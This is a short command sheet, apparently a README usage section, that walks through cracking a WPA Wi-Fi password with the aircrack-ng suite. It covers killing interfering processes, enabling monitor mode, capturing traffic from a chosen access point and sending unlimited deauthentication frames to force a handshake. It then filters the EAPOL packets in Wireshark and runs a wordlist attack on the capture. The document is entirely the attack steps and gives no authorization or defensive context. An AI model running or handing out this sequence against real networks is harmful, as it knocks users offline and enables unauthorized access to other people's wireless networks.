> ## Usage

```bash
iwconfig 
```
```ruby
sudo airmon-ng check kill
sudo airmon-ng start 'wlanname'
sudo airmon-ng
```
 
> !Check the interface
```bash
 iwconfig
 ```

> !Get  AP MAC's
```ruby
sudo airodump-ng 'wlan'
```
> !1st window
```ruby
sudo airodump-ng -w namefile -c channel --bssid BSSID wlanname
```
> !2 st window
```ruby
sudo aireplay-ng --deauth 0 -a BSSID wlanname
```
> open wireshark namefile.cap
```
eapol
```
> !Stop monitor
```ruby
airmon-ng stop wlanname
```
> !Read the file
```ruby
aircrack-ng filename.cap -w /yourdumptext.txt
```